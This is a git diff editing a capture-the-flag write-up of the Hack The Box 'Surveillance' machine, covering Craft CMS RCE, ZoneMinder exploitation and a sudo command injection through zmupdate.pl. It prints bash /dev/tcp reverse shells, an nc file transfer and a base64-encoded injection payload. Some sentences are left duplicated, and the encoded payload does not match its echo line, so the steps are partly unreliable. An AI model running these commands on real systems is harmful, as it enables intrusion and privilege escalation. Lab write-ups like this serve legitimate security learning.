@@ -28,7 +28,11 @@ tags:
 
 ## Port Scan
 
-First start with the *NMAP* scan:
+First, let's kick things off with an Nmap scan to enumerate open ports and services on the target:
+
+```bash
+nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.245
+```
 
 ```
 # Nmap 7.94SVN scan initiated Thu Mar 21 14:48:00 2024 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.245
@@ -55,7 +59,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Mar 21 14:48:57 2024 -- 1 IP address (1 host up) scanned in 57.52 seconds
 ```
 
-From the scan and with some help of *whatweb* I am able to see that the page is redirecting me to *surveillance.htb* so I proceed to add it to /etc/hosts
+The scan reveals SSH on port 22 and a web server (nginx) on port 80. The HTTP service redirects to http://surveillance.htb/, so let's add this to our /etc/hosts:
+
+```bash
+echo "10.10.11.245 surveillance.htb" | sudo tee -a /etc/hosts
+```
+Next, we use whatweb to gather more details about the web service:
 
 ```bash
 whatweb surveillance.htb
@@ -67,31 +76,36 @@ By checking the result of *whatweb* I can see from the begginning that we will b
 
 # FootHold
 
-I decided to check the page hosted in port 80, to see if i can find something else that can help us find out more about the CMS that we are working with .
-
 ![Alt text](/assets/images/htb-writeup-survellance/surv2.png)
 
-I look for possible vulnerabilities related to craft CMS and I found a possible CVE ([CVE-2023-41892](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_unauth_rce_cve_2023_41892/)); By reading at the page I can see that Craft CMS versions between **4.0.0-RC1 - 4.4.14** are vulnerable to unauthenticated Remote Code Execution
+Visiting the website on port 80, we identify the CMS version and discover a known vulnerability, ([CVE-2023-41892](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_unauth_rce_cve_2023_41892/)), which affects Craft CMS versions between **4.0.0-RC1 and 4.4.14**. This vulnerability allows for *unauthenticated remote code execution (RCE)*.
 
 * The vulnerability lies in how Craft CMS handles functionalities like *\GuzzleHttp\Psr7\FnStream* which allows for selective method invocation. An attacker can craft a specially crafted request that triggers this functionality and injects malicious code. This code could then be written to the system's log file.
 * Since Craft CMS parses the log files for certain purposes, the *injected code can be executed unintentionally*. This grants the attacker remote code execution capabilities.
 
-After doing some research you will be able to find a working exploit in [GitHub](https://github.com/Faelian/CraftCMS_CVE-2023-41892). I just execute the program and it gave me shell access as ***www-data***
+We find a working exploit on [GitHub](https://github.com/Faelian/CraftCMS_CVE-2023-41892).:
 
 ```bash
 python3 craft-cms.py http://surveillance.htb/
 ```
 
+Executing this exploit grants us shell access as `www-data`.
+
 ![Alt text](/assets/images/htb-writeup-survellance/surv3.png)
 
-Then i tried to stablish a better shell to not depend only on the exploit to have aceess to the box
+In order to stabilize the shell, I execute:
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.14.13/443 0>&1'
 ```
-while enumerating the system we can see two users (other than root) Matthew & ZoneMinder. With our current user (www-data) I found a backup directory that contains a zip file which was interesting to me because it is SQL backup file could contain some credentials or configuration information.
+# Privilege Escalation to Matthew 
+
+While enumerating the system we can see two users (other than root) Matthew & ZoneMinder. After looking around I find a backup directory containing a zip file which is containts SQL backup file:
 
 * **Path:**  /var/www/html/craft/storage/backups
+We transfer the file to our machine for inspection:
+
+while enumerating the system  With our current user (www-data) I found a backup directory that contains a zip file which was interesting.
 
 I send the file to my machine to inspect it.
 
@@ -105,8 +119,6 @@ nc -nlvp 443  > surv.zip
 ```bash
 nc 10.10.14.13 443 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
 ```
-
-# Escalating to Matthew 
 
 After reading the file you can see that it is creating some DB (creating tables and inserting data) and almost at the end you can find the data being inserted to user table
 
@@ -123,7 +135,8 @@ I am able to get a password match! --> **starcraft122490**
 
 # Escalating to ZoneMinder
 
-With the access to Matthew account already stablished i decided to do some more enumeration, so i decide to check if there is anything running on *localhost ports* that can lead to a possible privigilege escalation.
+
+With access to Matthew's account, I decided to do some more enumeration check for locally running services that might be exploitable:
 
 ```bash
 netstat -tunlp
@@ -165,13 +178,17 @@ proxychains python3 exploit-zone.py -t http://127.0.0.1:8080/ -ip 10.10.14.13 -p
 
 ![Alt text](/assets/images/htb-writeup-survellance/surv10.png)
 
+This grants us shell access as the `zoneminder` user.
+
 
 # Escalating to Root
 I check if I have any sudo privileges with "ZoneMinder" user
 
 ![Alt text](/assets/images/htb-writeup-survellance/surv11.png)
 
-so apparently i can run as sudo anything that is on /usr/bin and the *name starts with zm and ends in .pl* . I try to read the files but they are extremelly long to read each single one. i look online for *"escalate priviles zoneminder zm.pl"* and i found an interesting [GitHub](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-h5m9-6jjc-cgmw) page talking about something related.
+Checking for sudo privileges, we find that the zoneminder user can run scripts matching the pattern ***zm\*.pl in /usr/bin***:
+
+ i look online for *"escalate priviles zoneminder zm.pl"* and i found an interesting [GitHub](https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-h5m9-6jjc-cgmw) page talking about something related.
 
 The Security advisory basically says that this is affecting version < 1.36.33. I check our working version, since I did not knew if it was affected by the issue mentioned before
 
@@ -188,16 +205,18 @@ I check for config files of zoneminder and in found /etc/zm and it seems i can s
 
 * ZoneMinderPassword2023
 
-After reading for a while the codes and not finding much i encounter this code snippet from **zmupdate.pl**
+After reading for a while I was identify **zmupdate.pl** as a vulnerable script and craft a payload to exploit it. The script takes user input directly into a bash connection query, making it susceptible to command injection.
+
 
 ![Alt text](/assets/images/htb-writeup-survellance/surv14.png)
 
-the important part of this code is that the *user input is being put straight into the next sql (bash connection query)* so we can alter its behaviour; For this I encoded the following code in base64.
+
+To exploit this, we create a payload that provides a reverse shell. First, we encode the payload in base64 to safely pass it as a command:
 
 ```bash
 echo  "bash -c 'bash -i >& /dev/tcp/10.10.14.35/443 0>&1' " | base64 -w0 
 ```
-NOW I TRY TO send the payload
+NOW I send the payload:
 
 ```bash
 sudo /usr/bin/zmupdate.pl -v 1.19.0 -u ';echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy8xMjM0IDA+JjEnIAo=" |base64 -d |bash;'
